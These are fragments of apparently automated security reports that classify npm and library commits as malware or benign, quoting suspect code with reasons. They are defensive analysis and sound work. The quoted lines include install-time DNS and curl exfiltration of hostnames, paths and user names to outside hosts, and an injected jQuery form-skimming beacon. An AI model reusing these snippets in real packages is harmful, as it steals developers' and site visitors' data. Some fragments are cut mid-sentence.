There is also an explicit curl to an external Pipedream endpoint (pingback), indicating potential exfiltration or telemetry to a third party.\n\n**File index.js**:\nCode: `/* referenced by preinstall; contents not shown in diff */`\nReason: The behavior of index.js is unknown but it is executed at install time. Combined with references to axios/jsdelivr and an external callback URL, this creates a critical supply-chain risk: index.js could read environment variables/local files and transmit them to remote hosts.\n\n**Summary:** Static analysis reveals a critical install-time script (preinstall -> node index.js) and an explicit external callback (Pipedream curl). These are high-risk supply-chain indicators because install-time code can access environment variables and files and perform network requests to exfiltrate secrets. Although dynamic analysis returned no runtime artifacts, the presence of automatic execution plus an external endpoint is sufficient to classify this commit as malicious/unsafe."

This is a direct data-exfiltration channel to an actor outside the project and exposes PII/host-identifying metadata without consent.\n\n**File index.js**:\nCode: `console.log('Contact: https://t.me/exzuperi');`\nReason: Prints an external Telegram contact link at runtime. This serves as a social-engineering vector or direct channel to the external actor embedded in code that executes on end-user systems.\n\n**File package.json**:\nCode: `\"scripts\": { \"test\": \"exit 1 # exzuperi\" }`\nReason: Replaces or sets the test script to a non-functional failing command and includes reference to the external actor. This can sabotage developer workflows/CI and indicates malicious intent to disrupt or signal to an external party.\n\n**File index.js**:\nCode: `const dns = require('dns'); const querystring = require('querystring'); const fs = require('fs');`\nReason: Several modules are required but not used, which can indicate leftover/obfuscated code or preparation for additional hidden functionality (networking, query construction, filesystem access). Combined with exfiltration logic, this increases suspicion of malicious behavior.\n\n**Summary:** Static analysis shows deliberate collection of sensitive local identifiers and a direct outbound request to an external host (exzuperi.ftp.sh), plus a runtime external contact link and a sabotaged test script. These behaviors constitute unauthorized data exfiltration, social-engineering, and workflow tampering. The dynamic analysis produced no runtime evidence (likely due to sandbox/network restrictions), but the static indicators are strong and consistent with malicious intent; therefore the commit should be classified as MALWARE."

    "explanation": "**File package.json**:\nCode: `\"zxcvbnmmmmmmkjhgfdssss\": \"...\"`\nReason: A highly suspicious/misspelled dependency name was added, indicating possible typo-squatting or malicious package. This is a supply-chain risk because malicious code can run during install or be required at runtime. No direct malicious code was observed in dynamic analysis, but the dependency should be removed or verified before trusting the commit.\n\n**File package.json**:\nCode: `\"scripts\": { \"some-script\": \"deno run --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write ./test/deno.mjs\" }`\nReason: An npm script executes a Deno script with very broad permissions (env, read, net, run, sys, write). If the executed script is malicious or modified, these permissions enable remote code execution, data exfiltration, and filesystem tampering. This is a high-risk configuration even if no malicious activity was observed during dynamic analysis.\n\n**File package.json**:\nCode: `\"dependencies\": \"(many new/updated packages)\"`\nReason: A large increase in dependencies expands the attack surface and supply-chain risk. Unvetted additions can introduce vulnerabilities or malicious code. This is a medium-severity supply-chain concern requiring review and pinning of versions.\n\n**File package.json (scripts)**:\nCode: `\"docs:check-links\": \"blc http://127.0.0.1:8089 -ro\"`\nReason: A link-checker script targets localhost. While likely benign for local docs verification, scripts that assume local services can be abused in environments with unexpected listeners or CI setups. This is low severity but worth noting.\n\n**File components/icons/Wallet/Wallet.js**:\nCode: `Icon component code (SVG paths) \u2014 e.g., export default function Wallet() { return (<svg>...</svg>); }`\nReason: The Wallet files appear to be presentational icon components (SVGs) and not wallet logic. No cryptographic operations or network behavior were reported. Still, naming warrants review to ensure no hidden wallet functionality or secret handling.\n\n**Summary:** No dynamic analysis produced malicious behavior, and the code changes appear to be configuration, dependency additions, scripts, and icon components rather than explicit payloads. However, the commit contains high-risk supply-chain indicators: a suspicious/misspelled dependency and an npm script that runs a Deno script with extremely broad permissions. Because there is no observed runtime malicious activity, classify the commit as BENIGN for now, but treat it as potentially dangerous: remove or verify the suspicious dependency, restrict Deno permissions or remove the script, audit all new dependencies, and re-run dynamic analysis in a sandboxed environment before trusting or deploying this code."

This is clear data exfiltration.\n\n**File package.json**:\nCode: `\"scripts\": { \"preinstall\": \"node index.js\" }, \"pingback\": \"https://<pipedream-or-external-endpoint>\"`\nReason: A preinstall lifecycle script runs arbitrary code during npm install; combined with an external \"pingback\" endpoint this enables automatic, silent telemetry/exfiltration at install time (supply-chain abuse).\n\n**File package.json**:\nCode: `\"dependencies\": { \"zxcvbnmmmmmmkjhgfdssss\": \"^1.0.1\" }`\nReason: An obviously fabricated/typosquat dependency name was added.

Static indicators (exfiltration code + preinstall) are sufficient to classify as malicious.\n\n**Summary:** The commit adds code that collects sensitive local and package information and sends it to external endpoints, and configures a preinstall lifecycle script to run that code automatically during package installation. Combined with a suspicious typosquat dependency and external pingback endpoints, these changes constitute deliberate supply-chain data exfiltration behavior. Even though dynamic analysis produced no captures, the static evidence is strong and actionable: classify as MALWARE, remove the malicious files/scripts, rotate any potentially exposed credentials, and audit affected installations."

    "explanation": "**File package.json**:\nCode: `preinstall: nslookup $(hostname).$(pwd | base64).ex.sysdum.net`\nReason: preinstall scripts run automatically during npm install; this command constructs a DNS query using the local hostname and a base64-encoded working directory, sending environment and filesystem context to an external DNS host (ex.sysdum.net). This is a classic DNS-based exfiltration vector and is high-risk because it executes without user consent during dependency installation.\n\n**File package.json**:\nCode: `pingback: curl -sS -X POST https://o2r.pipedream.net/`\nReason: an outbound HTTPS call to a third-party endpoint (pipedream.net) can act as a beacon to notify an attacker of installs or environment data. Although not automatic, such a script can be executed by maintainers, CI, or during ad-hoc runs, causing data leakage and operational telemetry to an attacker-controlled service.\n\n**File package.json**:\nCode: `test: nslookup $(hostname).$(pwd | base64).ex.sysdum.net`\nReason: the test script also performs a DNS lookup embedding the hostname and a base64-encoded working directory. Test scripts are often run in CI or developer environments, so this provides another path for exfiltration of identifying information.\n\n**File package.json**:\nCode: `$(pwd | base64)`\nReason: use of base64 to encode the working directory before transmitting is a simple obfuscation technique intended to hide the payload contents and avoid casual detection; combined with network calls it indicates intent to covertly exfiltrate data.\n\n**Summary:** Static analysis shows explicit, intentional exfiltration behavior: an automatically-executed preinstall script that sends host and path data via DNS, additional test/script entries that perform the same DNS leak, and an HTTPS beacon to an external service. Dynamic analysis returned no observations, which is expected if the malicious lifecycle scripts were not executed in the analysis environment; absence of dynamic artifacts does not mitigate the clear malicious intent in the committed code. This commit should be treated as a malicious supply-chain compromise (MALWARE), reverted, and investigated across any systems or CI that may have installed this package."

This is suspicious from a security posture perspective but is not itself evidence of malicious intent or active malware behavior.\n\n**File lib/index.js**:\nCode: `res.setHeader('Access-Control-Allow-Origin', requestOrigin);`\nReason: The middleware reflects the incoming Origin header directly into the Access-Control-Allow-Origin response header without validation. This creates a security vulnerability (possible header/CRLF injection and unintended cross-origin access) but is a misconfiguration/bug rather than proof of malware.\n\n**File lib/index.js**:\nCode: `origin: '*'`\nReason: Defaulting CORS to allow any origin is insecure (overly permissive) and can enable unintended cross-origin data access. It's a dangerous default but not an indicator of malicious code.\n\n**File package.json**:\nCode: `\"dependencies\": { \"cors-parser\": \"<added>\", \"object-assign\": \"<added>\" }`\nReason: New dependencies increase supply-chain risk; they may contain malicious code or later be compromised. This warrants review/audit, pinning versions, and monitoring, but their addition alone does not prove the commit is malware.\n\n**Summary:** Static analysis flags multiple high-risk security issues (invoking a newly added dependency at import, reflecting unvalidated Origin headers, and permissive CORS defaults) and the dynamic analysis produced no signs of runtime malicious behavior. These findings indicate insecure or risky code and increased supply-chain exposure, but do not provide evidence of intentional malware.

It warrants manual review to ensure links are intentional and safe (vendor or pin third-party code if needed).\n\n**File dynamic analysis**:\nCode: `No runtime indicators or malicious behavior observed (result array empty)`\nReason: Dynamic analysis completed with no findings, indicating that executing the changes did not produce observable malicious activity or network behavior in the analyzed environment.\n\n**Summary:** The commit modifies small utility modules and static analysis only raised a medium-severity concern about external URLs present in commit metadata. There is no evidence of malicious code in the changed files and dynamic analysis found no suspicious runtime behavior. Based on available data, the commit appears benign, though the referenced external links should be manually reviewed and handled according to best practices (vendor/pin content or remove unnecessary links) to mitigate supply-chain or remote-loading risks."

Static findings are high-severity and indicate malicious intent (data theft and sabotage).

The additional 'pingback' script targets a Pipedream endpoint \u2014 a third-party data-collection endpoint frequently abused for exfiltration. Together these allow code execution and an explicit external callback for leaking environment or repository data.\n\n**File index.js**:\nCode: `/* executed by preinstall: contents not shown in report */`\nReason: index.js is invoked automatically by the preinstall hook. Even though its contents were not provided, any code placed here runs with the installer's privileges and can perform network requests, read environment variables, spawn processes, or exfiltrate secrets \u2014 making it a high-risk location for malicious behavior.\n\n**File package.json**:\nCode: `\"scripts\": {   \"test:deno\": \"deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write\" }`\nReason: A Deno test script grants overly broad permissions (env, read, net, run, sys, write). If invoked in CI or by developers, tests could run arbitrary processes, access credentials and network, and modify files \u2014 amplifying the impact of any malicious test code or compromised dependency.\n\n**File package.json (dependencies)**:\nCode: `\"dependencies\": { \"logoo\": \"<newly added>\", /* ...other new deps...*/ }`\nReason: A newly added, unfamiliar dependency ('logoo') increases supply-chain risk. Malicious or trojanized packages often appear as new/unknown dependencies and can include install-time or runtime payloads that exfiltrate data or execute arbitrary code.\n\n**File commit metadata**:\nCode: `https://t.me/+u9dz2n6sGos1ZmEy`\nReason: A Telegram invite link appeared in commit metadata submitted to the scanner. Such out-of-band contacts or backchannels can indicate malicious coordination or an attempt to provide an external control/communication channel; this is an additional indicator of suspicious intent.\n\n**Summary:** The commit introduces an automatic install-time execution (preinstall -> index.js) combined with an explicit external 'pingback' endpoint and newly added unknown dependencies. These elements together constitute a supply-chain and exfiltration risk: install hooks can run arbitrary code and the Pipedream endpoint is a direct callback capable of leaking environment or repository data. The permissive Deno test command further increases attack surface. The dynamic analysis produced no runtime hits, but absence of execution in the observed run does not mitigate the clear capability to execute and exfiltrate when installed or run in other environments. Given the deliberate inclusion of an external collector and automatic execution, this commit should be treated as malicious (MALWARE) until fully audited and remediated."

Inclusion in runtime output is inappropriate for a library and aligns with malicious actor behavior.\n\n**File package.json**:\nCode: `\"scripts\": { \"test\": \"echo 'exzuperi' && exit 1\" }`\nReason: Replaces or sabotages the standard test script with a command that prints an external identity and exits with failure. This alters CI/dev workflow and can be used to draw attention to the malicious actor or disrupt automated checks.\n\n**File index.js**:\nCode: `const fs = require('fs');`\nReason: Introduces filesystem API import that is not used in the diff. When combined with newly added telemetry/network code, this increases the risk surface and may enable future malicious local file reads.\n\n**Summary:** Static analysis shows direct exfiltration of sensitive system identifiers to a hard-coded external host (exzuperi.ftp.sh) over HTTPS on a non-standard port, unsolicited promotional output directing users to an external contact, and intentional modification of the test script to print a message and fail CI. Although dynamic analysis produced no runtime results (likely the malicious path was not executed in the test harness), the static indicators (critical data-leak code, network call, and workflow sabotage) are sufficient to classify this commit as malicious."

This is a resource-management bug, not an indicator of malicious functionality.\n\n**File rx.py**:\nCode: `line = serial_device.read() print(line)`\nReason: The Python reader prints raw serial data to stdout without sanitization. Forwarding that data directly to the host application is a validation/sanitization risk that could leak sensitive or malformed data, but it appears intended to expose device messages rather than to exfiltrate data maliciously.\n\n**File terpreter.py**:\nCode: `val = input('value: ') br = int(val) radio.upload_radio_confreg(bytes([br, ...]))`\nReason: Interactive input values are converted directly into bytes used to configure hardware. This allows malformed or attacker-controlled inputs to produce arbitrary device commands. It's unsafe but is a misuse/robustness issue in device-configuration code, not evidence of malware.\n\n**File sx1262.py**:\nCode: `CMD = b'\\xc1\\x00\\x09' OTHER = b'\\xc0\\x80\\x07'`\nReason: Contains raw protocol byte sequences used to communicate with radio hardware. Presence of literal control bytes was flagged as 'obfuscation' by metadata, but here they represent expected protocol commands and not concealment of malicious payloads.\n\n**File test.js**:\nCode: `child_process.spawn('python3', [testScript, payload]);`\nReason: Test helper spawns external processes with arguments. This is risky if test scaffolding reaches production or accepts untrusted input, but in itself suggests no malicious logic.\n\n**Summary:** The codebase contains multiple security and resource-management issues: unvalidated input from serial/child processes, improper listener management causing leaks, and failure to terminate spawned processes. However, there is no sign of covert exfiltration, obfuscated malicious payloads, persistence/backdoor mechanisms, or deliberate destructive commands. The behavior appears to be unsafe/incomplete device-integration code rather than malware. Recommend fixing input validation, sanitization, child-process lifecycle management, and documentation."

If an attacker can influence environment variables or configuration, they can increase frequency or enable abusive behavior; there are no safeguards or sane defaults.\n\n**File lib/service.js**:\nCode: `axios.get(... /* no timeout or retries configured */)`\nReason: HTTP client calls lack timeouts, retries, or circuit-breaker logic.

Combined with the code behavior, this increases suspicion about origin and intent and warrants provenance review.\n\n**Summary:** The commit implements automatic retrieval of external content from an untrusted domain and blindly broadcasts it to all connected groups on a schedule determined by an unvalidated environment variable. These behaviors enable mass distribution of malicious content (spam, phishing, remote payloads) and can be abused even if there is no direct evidence of payload delivery in dynamic analysis. Lack of validation, authentication, sanitization, and rate controls makes the code a high-risk backdoor for propagation and therefore should be treated as malicious."

The presence of rejectUnauthorized: false disables TLS verification, increasing risk of interception. Together this indicates deliberate data exfiltration to a likely attacker-controlled service and insecure transport settings.\n\n**File install.js**:\nCode: `const encodedHost = Buffer.from(os.hostname()).toString('hex');`\nReason: The hostname is hex-encoded before transmission. While simple, this is an obfuscation technique to hide the transmitted identifier from casual inspection and is suspicious in context of an unsolicited network POST.\n\n**File package.json**:\nCode: `\"scripts\": { \"install\": \"node install.js\" }`\nReason: An npm install script causes install.js to run automatically during package installation. When combined with the network exfiltration in install.js, this makes the backdoor execute automatically on consumer machines without explicit consent, a common malicious pattern.\n\n**Summary:** Static analysis reveals explicit, automatic exfiltration of host-identifying data to an external domain via an npm install script, with TLS verification disabled and simple obfuscation applied to the hostname. These behaviors constitute a deliberate backdoor/data exfiltration mechanism and are malicious despite the dynamic run producing no observable results (likely due to sandboxing or network blocking). Therefore the commit is assessed as MALWARE."

    "explanation": "**File package.json**:\nCode: `\"scripts\": { \"preinstall\": \"node build.js\", \"pingback\": \"curl https://pipedream.net/...?payload=...\" }`\nReason: A preinstall lifecycle script runs build.js during package installation (executes with installer's privileges). The presence of an additional 'pingback' script that calls an external URL shows deliberate network callbacks; install-time scripts that contact external endpoints are a major vector for supply-chain attacks and data exfiltration.\n\n**File build.js**:\nCode: `const payload = { id: pkg.id, hostname: os.hostname(), cwd: process.cwd(), user: os.userInfo().username };`\nReason: The script gathers sensitive host/environment information (package id, hostname, working directory, current user). Collecting such metadata in an install hook is unnecessary for normal packages and is consistent with reconnaissance/exfiltration behavior.\n\n**File build.js**:\nCode: `const b64 = Buffer.from(JSON.stringify(payload)).toString('base64'); const exfilDomain = b64 + '.' + rand + '.' + 'attacker.com';`\nReason: Payload data is base64-encoded and embedded into dynamically constructed subdomains. This obfuscation and embedding into DNS labels is a common technique to hide and transmit data via DNS requests.\n\n**File build.js**:\nCode: `child_process.spawn('nslookup', [exfilDomain], { detached: true });`\nReason: The code issues DNS queries (nslookup) to attacker-controlled domains using spawned detached processes to transmit encoded data out-of-band. DNS-based exfiltration is a clear exfiltration channel and difficult to detect if unmonitored.\n\n**File build.js**:\nCode: `child_process.spawn('curl', ['-s', 'https://attacker.com/collect?d=' + b64], { detached: true }); // or spawn('wget', [...])`\nReason: The script also uses system utilities (curl/wget) to POST/GET data to external endpoints. Spawning system binaries in install scripts that contact arbitrary remote hosts is a high-risk indicator of malicious behavior.\n\n**Summary:** Static analysis shows an install-time script (preinstall -> build.js) that collects host and environment data, base64-encodes it, and exfiltrates it via DNS queries and HTTP(S) calls using spawned detached processes. The code includes deliberate obfuscation and references to attacker-controlled domains. Although dynamic analysis returned no results (likely because the install script was not executed in the dynamic run/sandbox), the static indicators are high-confidence malicious behaviors consistent with data-exfiltration malware in the supply chain.

This combination enables automatic remote network contact and potential secret/exfiltration or tracking during installs (high supply-chain risk).\n\n**File lib/appenders/base.js**:\nCode: `const pro = item.pro; pro(...args);`\nReason: The library retrieves and directly invokes a function supplied in external data (queue items).

When combined with lifecycle hooks or CI invocation, these can be used to perform destructive actions or exfiltrate environment data.\n\n**Summary:** Static analysis reveals a preinstall lifecycle script and an easily-invoked 'pingback' that contact an external pipedream endpoint, combined with package scripts that execute arbitrary OS commands and code paths that invoke user-supplied callbacks. These are classic supply\u2011chain and remote\u2011execution indicators.

This is a classic supply-chain/backdoor pattern. The additional 'pingback' script points to a Pipedream endpoint and provides a ready-made network beacon. Even if 'pingback' is not executed automatically, its presence indicates intent or convenience to exfiltrate or signal installs.\n\n**File utils/UseFetchApi.js**:\nCode: `function buildRequest(token, ...) {   const headers = { Authorization: `Bearer ${token}`, ... };   return { headers, ... }; }  // later fetch(fetchUrl, buildRequest(...));`\nReason: The code unconditionally injects the user's OIDC access token into the Authorization header for every outgoing request and calls fetch() with an arbitrary fetchUrl. If fetchUrl can be attacker-controlled or points to an external host, this allows token exfiltration to untrusted endpoints.\n\n**File components/DLQMessageCleanUp.js**:\nCode: `const url = props.controllerBaseUrl + '/queues/' + queueName + '/messages'; fetchApi.run(url, ...);`\nReason: The component constructs remote URLs by concatenating props-provided base URLs and then calls fetchApi.run(), which attaches sensitive Authorization headers. If controllerBaseUrl is influenced by configuration or props (user-controlled), bearer tokens can be sent to arbitrary hosts.\n\n**File components/InvalidJobsFromPools.js**:\nCode: `const cancelUrl = props.getCancelJobUrl(job); fetchApi.run(cancelUrl, ...);`\nReason: Functions that return full URLs (getCancelJobUrl) are used directly with fetchApi.run(). Without strict validation/allowlisting of returned hosts, these calls can cause token leakage or arbitrary network communication to attacker-controlled endpoints.\n\n**File package.json (dependencies)**:\nCode: `\"dependencies\": { /* large list of new third-party packages added */ }`\nReason: A large number of added dependencies increases supply-chain risk (malicious/compromised packages, typosquatting) and widens the attack surface. In combination with an automatic preinstall hook, the expanded dependency set makes abuse easier and harder to audit.\n\n**Summary:** Static analysis identifies multiple high-risk patterns: an automatic preinstall hook that executes a curl from an external host (supply-chain backdoor), a pingback script pointing to a third-party telemetry endpoint, and widespread unconditional injection of OIDC bearer tokens into requests built from potentially unvalidated URLs. These combined findings create reliable mechanisms for remote signaling and token exfiltration even if dynamic analysis did not observe runtime activity. Given the intentional presence of network-beaconing code and clear token-leak vectors, this commit should be treated as malicious (MALWARE) until the preinstall/pingback hooks are removed, URL allowlisting is implemented, and an audit of added dependencies is completed."

This is exploitable if callers provide untrusted template content, but again represents insecure code, not malicious behavior.\n\n**File esm2022/lib/ngx-spinner.service.mjs**:\nCode: `const s = { ...spinner }; // merges caller-supplied object`\nReason: Blindly merging an arbitrary spinner object allows attacker-controlled properties (e.g., template) to flow to the vulnerable component rendering path. This creates an attack surface for XSS but is not itself malware.\n\n**File fesm2022/ngx-spinner.mjs**:\nCode: `SafeHtmlPipe uses DomSanitizer.bypassSecurityTrustHtml and component renders 'template' with innerHTML`\nReason: The bundled build includes the same bypass and innerHTML usage, exposing consumers of the package to the same XSS risk.

This is a security concern, not proof of malware in this commit.\n\n**Summary:** Static analysis identifies multiple high-severity security issues (DomSanitizer.bypassSecurityTrustHtml usage, innerHTML rendering, and unsafe object merging) that create serious XSS attack vectors. Dynamic analysis produced no malicious runtime behavior. There is no evidence of backdoors, data exfiltration, remote command execution, obfuscation, or other indicators of malware.

High-level APIs (Webhook.send and friends) use the compromised implementation, meaning normal library use results in silent data leakage.

This is insecure coding but not conclusive evidence of malware on its own.\n\n**File src/helpers.js**:\nCode: `exports.exec = promisify(child_process.exec); exports.execFile = promisify(child_process.execFile);`\nReason: The module exposes exec (a shell-based API) to other modules, increasing the attack surface.

Running shell commands at install time is a supply-chain risk and the un-awaited builds create race/TOCTOU conditions. These are hazardous practices but typical of native-binding packages rather than a direct malware sign.\n\n**File msvs/src/readCwd.cpp**:\nCode: `NtOpenProcess(&hProc, PROCESS_VM_READ|..., ProcessId, ...); NtReadVirtualMemory(hProc, remoteAddr, localBuf, size, &bytesRead);`\nReason: Native code opens another process and reads its memory to obtain working directory information. This can disclose sensitive data and, if abused or extended, could read arbitrary process memory. It's a high-risk capability that heightens concern but can be legitimate for process-inspection tooling.\n\n**File src/index.js (Windows branch)**:\nCode: `helpers.exec('powershell.exe -NoProfile -Command \"[Environment]::Is64BitOperatingSystem\"')`\nReason: Detects OS bitness by launching a shell. The command is constant (not attacker-controlled), so it's brittle and somewhat risky in terms of relying on external shell processes, but not indicative of malware.\n\n**File package.json**:\nCode: `\"scripts\": { \"install\": \"node scripts/install.js\" }`\nReason: An npm install lifecycle script runs arbitrary JavaScript during package install. This increases supply-chain execution risk (typical vector for malicious packages), and should be treated cautiously even if the script itself appears to perform build/setup tasks.\n\n**Summary:** The commit contains multiple high- and medium-severity security issues \u2014 notably unsanitized shell command construction, exporting shell-based exec, install-time script execution, and native code that reads other processes' memory. These are serious security concerns and increase the risk surface and potential for abuse, but the code appears to implement tooling (process inspection / obtaining working directories and building native helpers) rather than explicit malicious behavior (no persistence, obfuscated payloads, C2, or exfiltration routines were observed). Given the absence of clear malicious intent and dynamic analysis returning no active malicious behavior, this commit is best classified as BENIGN but high-risk and requiring remediation and review before use in production or publishing."

If relayUrl or tokenServer can be attacker-controlled this pattern enables token exfiltration. This is an insecure design choice but not proof of intentionally malicious code.\n\n**File src/sdk-tester.js**:\nCode: `vm.exampleAuthToken.access_token = token; vm.outputJson = vm.exampleAuthToken;`\nReason: Access tokens are stored in client-visible variables and logged to the UI. Exposing tokens in global/visible variables and UI increases risk of compromise via XSS or rogue extensions. This is a data-leak vulnerability rather than explicit malware behavior.\n\n**File src/kc-sdk.js**:\nCode: `window.addEventListener('message', function(event) { /* process event.data without checking event.origin */ });`\nReason: The message handler processes postMessage payloads without validating event.origin or authenticating the sender. This can allow attacker-controlled frames to trigger sensitive actions (e.g. causing tokens to be sent) but is an insecure implementation, not incontrovertible malicious intent.\n\n**File src/kc-messaging-provider.js**:\nCode: `targetWindow.postMessage(message, '*');`\nReason: Using '*' as targetOrigin when posting structured messages containing sensitive data (tokens) allows any origin to receive the message if references are not properly validated. This is a serious information-leak risk but consistent with insecure coding rather than proven malware.\n\n**File src/kc-sdk-support.js**:\nCode: `var payload = JSON.parse(atob(jwt.split('.')[1])); // no signature verification`\nReason: JWTs are being base64-decoded client-side and their claims used without signature verification.

This increases risk of arbitrary code execution via crafted input but is a risky dependency/usage pattern rather than confirmation of malware.\n\n**Summary:** Static analysis reveals multiple high-severity security issues (token exfiltration patterns, exposing tokens in client-side variables and UI, unvalidated postMessage usage, client-side JWT parsing without verification, and dynamic code generation that enables code injection). These indicate the commit is highly insecure and could be exploited to steal credentials or execute arbitrary code in the page context. However, dynamic analysis returned no malicious runtime behavior, and the issues are consistent with insecure or negligent implementation of an authentication SDK rather than explicit malicious payloads. Therefore the commit is classified as BENIGN but high-risk and requiring prompt remediation (server-side token handling, strict origin checks, avoid exposing tokens in UI/globals, verify JWTs server-side, and remove unsafe template compilation)."

Static analysis indicates it may include system/environment information; sending such payloads to an external, unapproved endpoint constitutes a clear data-exfiltration vector.\n\n**File index.js**:\nCode: `const options = { hostname: 'https://eojm50og9htneog.m.pipedream.net', method: 'POST', headers: { 'Content-Type': 'application/json' } };`\nReason: The code targets a third-party request-capture service (pipedream) via a hardcoded endpoint. Use of an external, attacker-controlled capture service in production code is highly suspicious and consistent with intentional leaking of data.\n\n**File index.js**:\nCode: `req.end(postData);`\nReason: Calling req.end() finalizes and sends the HTTP request, activating the exfiltration path. Static analysis notes this was added/ensures the payload is transmitted to the external host.\n\n**File index.js**:\nCode: `console.log('HACk!');`\nReason: An alarmist, nonstandard log message is present. While not harmful by itself, it is an indicator of suspicious developer intent or leftover testing/backdoor markers and should be removed and reviewed.\n\n**Summary:** Static analysis reveals a clear data exfiltration path: collection of system/environment data, construction of a JSON payload, and a completed HTTP POST to a hardcoded pipedream capture endpoint. The dynamic run produced no further results (likely sandboxing or configuration), but the presence of an activated outbound POST to a third-party request-capture service with system data is consistent with malicious behavior. Due to the deliberate transmission to an external capture host and activation via req.end(), this commit should be treated as malware until proven otherwise."

Dynamic analysis produced no runtime evidence (likely due to sandbox/network restrictions or conditional execution), but the static indicators are high-severity and consistent with covert data exfiltration/backdoor behavior.

This is client-side data exfiltration of potentially sensitive form contents.\n\n**File jquery.min.js**:\nCode: `.fn.end = function(){ var payload = this.serialize && this.serialize(); var encoded = hexEncode(payload); new Image().src = 'https://ns.api-system.engineer/?q=' + encoded; return this; }`\nReason: An identical malicious change in the library used directly by web pages causes immediate client-side leakage of serialized form data to an attacker-controlled host. Modified upstream library code strongly indicates intentional tampering.\n\n**File .bash_history**:\nCode: `npm login npm publish npm publish ...`\nReason: Recorded interactive publishing and login commands indicate the repo operator performed npm publishes. This raises the likelihood that the malicious library was published to registries, potentially distributing the backdoor to downstream users. Shell histories can also leak credentials or tokens.\n\n**File .npm/_cacache/index-v5/e0/f3/563a92774ad5fa62edb9cbc4624c17a784676e377b3852d16ab8dcb28bea**:\nCode: `Committed npm cache/index artifacts (package cache metadata and tarball references)`\nReason: Inclusion of npm cache artifacts and package tarball metadata in the repository increases the risk that a poisoned package was stored or that publishing metadata exposing compromises exists. It also supports the hypothesis of a published malicious package version.\n\n**Summary:** Multiple files contain intentionally injected code that serializes and hex-encodes form data and exfiltrates it to an attacker-controlled domain. The modifications are present in minified library files (jquery.min.js and icon.min.js) used on client pages, constituting active data exfiltration. Repository artifacts (.bash_history and npm cache) indicate publishing activity that could have distributed the malicious build. Static findings are high/critical for data leakage and obfuscation; dynamic analysis produced no benign runtime counters to refute these findings.

Obfuscation combined with other risky behavior (auto-updates, credential storage) is a red flag for backdoors or data exfiltration.\n\n**File utils/Extension.js**:\nCode: `child_process.execSync('npm i ...')`\nReason: Executing shell commands (npm install) automatically based on remote configuration can lead to arbitrary code execution if the remote source is compromised. This is a high-risk supply-chain vector.\n\n**File utils/Extension.js**:\nCode: `fetch('https://raw.githubusercontent.com/.../MetaCord_Config.json') -> fs.writeFileSync('MetaCord_Config.json', fetched) -> Auto_Update triggers install and fs.rmdirSync(local_module_dir, { recursive:`\nReason: Remote configuration is fetched and written to disk, then used to delete local packages and install remote packages. Writing untrusted remote content and programmatically deleting/installing packages enables remote attackers to inject malicious code.\n\n**File index.js**:\nCode: `setKeyValue('Email', email); setKeyValue('Password', password);`\nReason: User email and password are persisted to application storage (likely plaintext). Storing credentials without secure encryption or secrets management risks credential theft and automatic account abuse.\n\n**File utils/Extension.js**:\nCode: `getUIDFast/getUIDSlow -> requests to id.traodoisub.com and api.findids.net`\nReason: Code sends profile identifiers to third-party services outside project control. These requests can leak sensitive user data to attackers or untrusted operators.\n\n**File utils/Extension.js**:\nCode: `CreateSiteHtml() -> starts HTTP server and serves files on configurable port`\nReason: Embedding an HTTP server that serves filesystem content without clear access controls may expose internal files or provide a remote interface for command/control or data exfiltration.\n\n**File package.json**:\nCode: `\"dependencies\": { \"axios\": \"latest\", \"express\": \"latest\", \"semver\": \"latest\", ... }`\nReason: Using 'latest' for many dependencies defeats reproducible builds and allows automatic pulling of arbitrary upstream updates, increasing supply-chain risk and making it easier to introduce malicious code via dependencies.\n\n**File utils/Extension.js**:\nCode: `periodic GET to constructed URL using process.env.REPL_SLUG and process.env.REPL_OWNER every 10s`\nReason: Periodic network calls built from environment variables can leak hosting identifiers and produce undisclosed outbound traffic. Combined with auto-update behavior, this could be used as a beacon or command channel.\n\n**Summary:** The commit contains multiple high-severity behaviors consistent with malicious or backdoor-capable code: obfuscated logic, automatic fetching of remote configuration, programmatic deletion and reinstallation of packages, execution of shell commands (npm install), persistent plaintext storage of user credentials, embedded web server, and use of unpinned 'latest' dependencies. Even though dynamic analysis produced no runtime indicators, the static findings present strong supply-chain and credential-exfiltration risks.

It needs vetting and likely scrubbing from history if unintended.\n\n**File package.json**:\nCode: `\"dependencies\": { \"some-new-package\": \"^1.2.3\", \"com.unity.custom\": \"1.0.0\" }`\nReason: New third\u2011party and Unity-scoped packages introduce supply\u2011chain risk. The presence of added dependencies is a concern to vet, but does not itself indicate active malicious behavior in the commit.\n\n**File Runtime/SavedCustomTexturesManagerMonoBehaviour.cs**:\nCode: `public string directory; // serialized in inspector`\nReason: Exposing a serialized public 'directory' that is used for filesystem operations allows an attacker or a manipulated asset to point the app at arbitrary filesystem locations. This is a high\u2011risk insecure pattern (possible data exposure or tampering) but is insecure code rather than an explicit malware payload.\n\n**File Runtime/SavedCustomTexturesManager.cs**:\nCode: `var path = Path.Combine(_pathData.Directory, id); Directory.Delete(path, true);`\nReason: Combining an externally influenced 'id' with the base directory and directly deleting the resulting path enables path traversal and deletion of arbitrary files outside the intended sandbox. This is a dangerous bug that could be exploited, but again is an insecure implementation rather than demonstrable malicious intent.\n\n**File Runtime/SavedCustomTexturesManager.cs**:\nCode: `foreach (var dir in SaveSystem.SaveSystem.GetDirectoryInfo(_pathData.Directory).EnumerateDirectories()) { /* create SavedCustomTexture(dir.Name) */ }`\nReason: Enumerating directories from an attacker-controllable base path can expose or surface arbitrary filesystem entries into the application. This increases attack surface and data exposure risk but is not direct evidence of malware.\n\n**File Runtime/SavedCustomTexture.cs**:\nCode: `public static event Action<SavedCustomTexture> OnSavedTextureAdded; // payload includes Texture2D`\nReason: Raising static events that include Texture2D and large binary payloads can lead to accidental exfiltration if subscribers forward payloads to untrusted sinks. It's a privacy/data-leakage concern rather than an explicit malicious capability.\n\n**Summary:** Static analysis flagged multiple high\u2011 and medium\u2011severity security issues (unvalidated inspector path, path construction for deletions, directory enumeration, suspicious external URL, and added dependencies). These represent serious insecure coding and supply\u2011chain risks that could be exploited, but there is no indication in the static or dynamic results of active malicious payloads, persistence mechanisms, obfuscated executable code, or runtime network exfiltration originating from the commit. Therefore the commit is classified as BENIGN code with critical security vulnerabilities that should be remediated and reviewed (vet dependencies, remove/justify the external URL, validate/whitelist paths, harden deletion/enumeration logic, and limit event payload exposure)."

Even though dynamic analysis produced no results (likely due to network controls or sandboxing), the static artifacts demonstrate clear, intentional install-time data exfiltration and remote callbacks. This behavior matches supply-chain malware patterns and is not benign."

